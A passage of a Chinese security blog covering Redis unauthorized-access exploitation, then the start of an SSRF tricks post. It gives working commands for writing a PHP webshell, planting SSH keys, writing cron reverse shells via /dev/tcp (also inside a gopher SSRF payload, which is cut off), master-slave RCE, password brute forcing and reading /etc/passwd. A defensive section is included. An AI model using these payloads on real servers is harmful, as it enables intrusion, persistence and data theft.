CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;&quot;</span><br></pre></td></tr></table></figure><p>默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。</p><p>你可以通过以下命令来修改该参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG set requirepass &quot;runoob&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;runoob&quot;</span><br></pre></td></tr></table></figure><p>设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。</p><p>密码验证用到AUTH命令，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; AUTH &quot;password&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SET mykey &quot;Test value&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; GET mykey</span><br><span class="line">&quot;Test value&quot;</span><br></pre></td></tr></table></figure><h2 id="0x02-Redis漏洞攻击利用"><a href="#0x02-Redis漏洞攻击利用" class="headerlink" title="0x02 Redis漏洞攻击利用"></a>0x02 Redis漏洞攻击利用</h2><p>Redis漏洞包括未授权访问漏洞所引起的一系列深入攻击利用以及其他一些已知的Redis CVE漏洞。</p><p>在旧版本中Redis默认配置的服务是监听在公网的，而在最近这些新版本中都默认将监听地址改为本地监听，即前面redis.conf中看到的<code>bind 127.0.0.1</code>。</p><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>由于配置不当的原因，导致Redis服务暴露在公网（即绑定在0.0.0.0:6379），并且没有开启相关认证和添加相关安全策略的情况下，即存在未授权访问漏洞。</p><p>攻击者在未授权访问Redis的情况下，可以获取数据库的所有数据、删除数据库数据等，进一步地可以利用Redis相关方法来实现写入WebShell、写入Crontab定时任务、写入SSH公钥以及利用主从复制RCE等一系列的攻击利用，将Redis未授权访问漏洞的危害无限放大。</p><h4 id="敏感信息泄露与数据库内容删除"><a href="#敏感信息泄露与数据库内容删除" class="headerlink" title="敏感信息泄露与数据库内容删除"></a>敏感信息泄露与数据库内容删除</h4><p>使用Redis的语句可以获取数据库中的存储的敏感信息，这里为了方便直接通过<code>keys *</code>来获取所有的键，然后通过get命令获取键值（如果在实际的业务中，一般不会查询所有键，因为对性能影响太大了，而是通过查询指定的某些数据库内容）：</p><p><img src="/2020/03/05/Redis安全小结/1.png" alt=""></p><p>使用info命令可以看到Redis的版本、OS内核版本、配置文件路径等信息：</p><p><img src="/2020/03/05/Redis安全小结/2.png" alt=""></p><p>使用flushall等相关命令可以将Redis数据库所有内容删除掉，注意要慎用：</p><p><img src="/2020/03/05/Redis安全小结/3.png" alt=""></p><h4 id="向Web目录写入WebShell"><a href="#向Web目录写入WebShell" class="headerlink" title="向Web目录写入WebShell"></a>向Web目录写入WebShell</h4><p>前提是Redis所在机子开启了Web服务，且已知Web服务目录路径。</p><p>原理就是在Redis中插入一条数据，将WebShell代码作为value，key值随意，然后通过修改数据库的默认路径为Web服务目录和默认的缓存文件为WebShell文件，最后通过save命令以备份的方式把缓存的数据保存在文件里，这样就可以在服务器端的Web目录下生成一个WebShell文件。</p><p>具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload &quot;&lt;?php @eval($_POST[c]);?&gt;&quot;</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/4.png" alt=""></p><p>在服务端看到生成的shell.php内容如下，可以看到PHP代码穿插其中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REDIS0007�redis-ver3.2.11�</span><br><span class="line">redis-bits�@�ctime� c^used-mem�h�</span><br><span class="line">                                  ��payload&lt;?php @eval($_POST[c]);?&gt;�hUuϞ^</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/5.png" alt=""></p><p>由于PHP的容错性，该PHP代码是能正常执行的，能正常getshell：</p><p><img src="/2020/03/05/Redis安全小结/6.png" alt=""></p><h4 id="写入SSH公钥直接登录"><a href="#写入SSH公钥直接登录" class="headerlink" title="写入SSH公钥直接登录"></a>写入SSH公钥直接登录</h4><p>前提是Redis服务是以root权限运行的。</p><p>原理和前面一样的，只是备份的目录和文件名修改为/root/.ssh/目录和authorized_keys文件名。</p><p>先在Ubuntu中生成公私钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/7.png" alt=""></p><p>获取公钥内容<code>cat /home/ski12/.ssh/id_rsa.pub</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/8.png" alt=""></p><p>通过Redis客户端将公钥内容写入到/root/.ssh/authorized_keys文件中，注意保存key的时候加上两个<code>\n</code>是为了避免和Redis里其他缓存数据混合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set payload &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/9.png" alt=""></p><p>为了不用自己复制粘贴公钥内容，换种形式也OK：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; m7.txt</span><br><span class="line">cat m7.txt | redis-cli -h 192.168.10.137 -p 6379 <span class="built_in">set</span> payload</span><br></pre></td></tr></table></figure><p>此时看到Kali中的/root/.ssh/目录中成功生成了authorized_keys文件的：</p><p><img src="/2020/03/05/Redis安全小结/10.png" alt=""></p><p>注意，如果Kali中的SSH服务还没开启的话，通过如下命令开启即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start ssh</span><br></pre></td></tr></table></figure><p>接着在Ubuntu上使用私钥直接SSH远程连接到Kali，得到shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.137</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/11.png" alt=""></p><h4 id="写入定时任务反弹shell"><a href="#写入定时任务反弹shell" class="headerlink" title="写入定时任务反弹shell"></a>写入定时任务反弹shell</h4><p>该方法只能CentOS上使用，Ubuntu、Debian上行不通。原因如下：</p><ul><li>权限问题，Ubuntu定时任务需要root权限；</li><li>Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；</li></ul><p>原理和前面是一样的，只是备份的目录和文件名修改了下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set payload &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.307/666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/13.png" alt=""></p><p>注意，不同类型、版本的OS的crontabs所在路径会有所区别。</p><p>可以看到在Kali中成功生成root文件，其中含有定时任务的内容，也包括了乱码：</p><p><img src="/2020/03/05/Redis安全小结/12.png" alt=""></p><p>此时并未在监听端接收到反弹shell。这是由于Kali是Debian系统，对定时任务的格式要求很严，而root文件内容含有乱码，会导致执行不成功。除此之外，还有root文件执行的权限问题，我们通过<code>tail /var/log/syslog</code>命令来查看如下错误信息，因为权限不够、所以cron拒绝执行该定时任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cron[441]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/14.png" alt=""></p><p>具体CentOS的利用可自行测试。</p><p>不同OS的系统任务调度文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Debian</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine</span><br><span class="line">/etc/cron.d/xxx</span><br></pre></td></tr></table></figure><blockquote><p>可进行利用的cron有如下几个地方：</p><ul><li>/etc/crontab 这个是肯定的</li><li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li><li>/var/spool/cron/root centos系统下root用户的cron文件</li><li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li></ul></blockquote><h4 id="其他的利用"><a href="#其他的利用" class="headerlink" title="其他的利用"></a>其他的利用</h4><p>任何可利用Redis未授权访问漏洞来写文件的地方都能被进行恶意利用，除了前面几项利用方式外，还有以下收集的几个在Linux或Windows下的利用方式。</p><p>写入/etc/passwd文件实现任意账号密码重置：<a href="https://www.freebuf.com/vuls/148758.html#-etcpasswd" target="_blank" rel="noopener">https://www.freebuf.com/vuls/148758.html#-etcpasswd</a></p><p>写入Windows启动项：<a href="https://www.anquanke.com/post/id/170360#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-3</a></p><p>写入Windows MOF：<a href="https://www.anquanke.com/post/id/170360#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-4</a></p><h3 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h3><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>如果把数据存储在单个Redis中，而读写体量比较大的时候，服务端的性能就会大受影响。为了应对这种情况，Redis就提供了主从模式。</p><p>Redis主从模式是指使用一个Redis作为主机，其他Redis则作为从机即备份机。其中主机和从机数据相同，主机只负责写，从机只负责读，通过读写分离可以大幅度减轻流量的压力，即是一种通过牺牲空间来换取效率的缓解方式。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>主从复制实现RCE还是属于未授权访问的一种利用方式，这里因为其较新型便单独提出一小节。</p><p>4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。</p><p>Redis主从数据库之间的同步分为两种：</p><ul><li>全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中；</li><li>部分复制只是将写命令发送给从机；</li></ul><p>因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。</p><p>这里我们只需要模拟协议收发包就能伪装成Redis主机了，利用工具如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br></pre></td></tr></table></figure><p>第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。</p><p>首先要生成恶意so文件，下载第一个工具然后make即可生成。</p><p>然后在攻击者机器上执行如下命令即可成功RCE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.10.137 -p 6379 -L 192.168.10.141 -f module.so</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/15.png" alt=""></p><h3 id="用Hydra暴力破解Redis密码"><a href="#用Hydra暴力破解Redis密码" class="headerlink" title="用Hydra暴力破解Redis密码"></a>用Hydra暴力破解Redis密码</h3><p>使用Hydra工具可以对Redis密码进行暴力破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P /home/fragrant/sec_tools/w3af/w3af/core/controllers/bruteforce/passwords.txt redis://192.168.10.137</span><br></pre></td></tr></table></figure><h3 id="历史CVE漏洞"><a href="#历史CVE漏洞" class="headerlink" title="历史CVE漏洞"></a>历史CVE漏洞</h3><h4 id="Redis远程代码执行漏洞（CVE-2016-8339）"><a href="#Redis远程代码执行漏洞（CVE-2016-8339）" class="headerlink" title="Redis远程代码执行漏洞（CVE-2016-8339）"></a>Redis远程代码执行漏洞（CVE-2016-8339）</h4><p>Redis 3.2.x &lt; 3.2.4 版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，从而RCE。</p><h4 id="CVE-2015-8080"><a href="#CVE-2015-8080" class="headerlink" title="CVE-2015-8080"></a>CVE-2015-8080</h4><p>Redis版本 2.8.x &lt; 2.8.24 和 3.0.x &lt; 3.0.6 中，lua_struct.c中的getnum函数存在整数溢出漏洞，导致攻击者可以运行Lua代码或可能绕过沙盒限制。</p><h4 id="CVE-2015-4335"><a href="#CVE-2015-4335" class="headerlink" title="CVE-2015-4335"></a>CVE-2015-4335</h4><p>Redis 2.8.1 之前版本和 3.0.2 之前版本中存在安全漏洞，攻击者可以远程执行eval命令，利用该漏洞执行任意Lua字节码。</p><h4 id="CVE-2013-7458"><a href="#CVE-2013-7458" class="headerlink" title="CVE-2013-7458"></a>CVE-2013-7458</h4><p>读取”.rediscli_history”配置文件信息。</p><h3 id="不存在NoSQL注入问题？"><a href="#不存在NoSQL注入问题？" class="headerlink" title="不存在NoSQL注入问题？"></a>不存在NoSQL注入问题？</h3><p>目前来说是的。</p><p>Redis客户端在与Redis服务端进行通信时，会使用RESP（REdis Serialization Protocol）协议。Redis客户端对所有的命令进行格式化处理，将不同参数组成的命令转换为符合RESP协议格式的数据，发送给Redis服务端的所有参数都是二进制安全的。</p><p>以下是RESP协议的通用形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&lt;number of arguments&gt; CR LF</span><br><span class="line">$&lt;number of bytes of argument 1&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br><span class="line">...</span><br><span class="line">$&lt;number of bytes of argument N&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br></pre></td></tr></table></figure><p>例子如下，原本命令为<code>SET mykey myvalue</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">SET</span><br><span class="line">$5</span><br><span class="line">mykey</span><br><span class="line">$7</span><br><span class="line">myvalue</span><br></pre></td></tr></table></figure><p>Redis客户端格式化后的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$7\r\nmyvalue\r\n&quot;</span><br></pre></td></tr></table></figure><p>Redis协议里面没有字符串转义相关的内容，Redis协议使用的是前缀长度的字符串，完全二进制，保证安全性，所以是不存在NoSQL注入的。</p><p>Lua脚本执行EVAL和EVALSHA命令时遵循相同的规则，因此这些命令也是安全的。</p><p>Redis协议规范可参考：<a href="http://www.redis.cn/topics/protocol.html" target="_blank" rel="noopener">http://www.redis.cn/topics/protocol.html</a></p><p>Redis通信过程分析可参考：<a href="https://draveness.me/redis-cli" target="_blank" rel="noopener">https://draveness.me/redis-cli</a></p><h2 id="0x03-漏洞组合拳"><a href="#0x03-漏洞组合拳" class="headerlink" title="0x03 漏洞组合拳"></a>0x03 漏洞组合拳</h2><p>一些比较鸡肋的Web漏洞，在和本地Redis未授权访问漏洞组合进行深入利用后，往往会将危害达到最大化。</p><h3 id="SSRF打本地Redis服务"><a href="#SSRF打本地Redis服务" class="headerlink" title="SSRF打本地Redis服务"></a>SSRF打本地Redis服务</h3><p>前提是Web服务器监听本地的Redis存在未授权访问漏洞，并且Web站点支持Gopher协议。这里就能把范围缩小了，PHP是支持Gopher协议的，而Java不支持。</p><p>具体可参考：<a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用 Gopher 协议拓展攻击面</a></p><h3 id="Python-urllib-CRLF注入打本地Redis服务"><a href="#Python-urllib-CRLF注入打本地Redis服务" class="headerlink" title="Python urllib CRLF注入打本地Redis服务"></a>Python urllib CRLF注入打本地Redis服务</h3><p>如果目标站点使用了Python漏洞版本的urllib库，并且请求的url外部可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问漏洞的Redis，那么服务器就存在被getshell的风险。</p><p>原理和组合SSRF漏洞完全一样，通过CRLF注入来利用Redis向Crontab写入反弹shell的定时任务。</p><p>具体可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul><li>禁止公网开放Redis服务，可以在防火墙上禁用6379端口；</li><li>修改Redis服务端口为其他非常见的端口号；</li><li>配置Redis的密码访问验证；</li><li>禁用不使用的高危命令；</li><li>重命名高危命令的名称；</li><li>以低权限运行Redis服务，禁止用root等最高权限运行；</li><li>确保authorized_keys文件的安全，尽量阻止其他用户添加新的公钥；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.freebuf.com/vuls/224235.html" target="_blank" rel="noopener">记一次Redis+Getshell经验分享</a></p><p><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/" target="_blank" rel="noopener">Redis 基于主从复制的RCE利用方式</a></p><p><a href="https://zhuanlan.zhihu.com/p/75627194" target="_blank" rel="noopener">redis未授权访问漏洞利用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Redis" scheme="https://www.mi1k7ea.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>SSRF Tricks小结</title>
    <link href="https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks小结/</id>
    <published>2020-02-29T15:53:30.000Z</published>
    <updated>2020-03-08T09:08:08.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSRF漏洞原理很简单，这里只整理下SSRF的一些绕过技巧以及在不同语言下的细微差别。</p><h2 id="0x01-SSRF-in-PHP"><a href="#0x01-SSRF-in-PHP" class="headerlink" title="0x01 SSRF in PHP"></a>0x01 SSRF in PHP</h2><h3 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h3><p>在PHP中，涉及到SSRF漏洞的函数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>其中有如下几个注意点：</p><ul><li>大部分PHP并不会开启fsockopen()的Gopher Wrapper；</li><li>file_get_contents()的Gopher协议不能进行URLencode；</li><li>file_get_contents()关于Gopher的302跳转有bug，会导致利用失败；</li><li>file_get_contents()支持php://input协议；</li><li>curl/libcurl 7.43版本上Gopher协议存在bug即%00截断，经测试7.49版本可用；</li><li>curl_exec()默认不跟踪跳转；</li></ul><p>curl_exec()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure><p>file_get_contents()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = $_GET[<span class="string">'url'</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br></pre></td></tr></table></figure><p>fsockopen()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) </span><br><span class="line">        &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>在PHP中能够进行SSRF攻击利用的协议：</p><ul><li>http/https：主要用来探测内网服务，根据响应的状态判断内网端口及服务，可以结合如Struts2的RCE来实现攻击；</li><li>file：读取服务器上的任意文件内容；</li><li>dict：除了泄露安装软件版本信息，还可以查看端口，操作内网Redis服务等；</li><li>gopher：能够将所有操作转换成数据流，并将数据流一次发送出去，可以用来探测内网的所有服务的所有漏洞，可利用来攻击Redis和PHP-FPM；</li><li>ftp/ftps：FTP匿名访问、爆破；</li><li>tftp：UDP协议扩展，发送UDP报文；</li><li>imap/imaps/pop3/smtp/smtps：爆破邮件用户名密码；</li><li>telnet：SSH/Telnet匿名访问及爆破；</li></ul><h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>PHP中的curl_exec()函数导致的SSRF漏洞在CTF中是经常遇到的，该函数会执行cURL会话。</p><p>可以通过<code>curl -V</code>命令查看curl版本及其支持的协议类型：</p><p><img src="/2020/02/29/SSRF-Tricks小结/1.png" alt=""></p><p>可以看到，我本地kali的是支持dict、file、gopher等等协议的。因此本地利用可使用上述几个协议。</p><p>注意：Windows使用curl命令需要把单引号换成双引号。</p><h4 id="file-协议任意读文件"><a href="#file-协议任意读文件" class="headerlink" title="file://协议任意读文件"></a>file://协议任意读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;file:///etc/passwd&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/2.png" alt=""></p><h4 id="dict-协议探测端口及banner信息"><a href="#dict-协议探测端口及banner信息" class="headerlink" title="dict://协议探测端口及banner信息"></a>dict://协议探测端口及banner信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22&apos;</span><br><span class="line">curl -v &apos;dict://127.0.0.1:6379/info&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/3.png" alt=""></p><h4 id="gopher-协议反弹shell"><a href="#gopher-协议反弹shell" class="headerlink" title="gopher://协议反弹shell"></a>gopher://协议反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 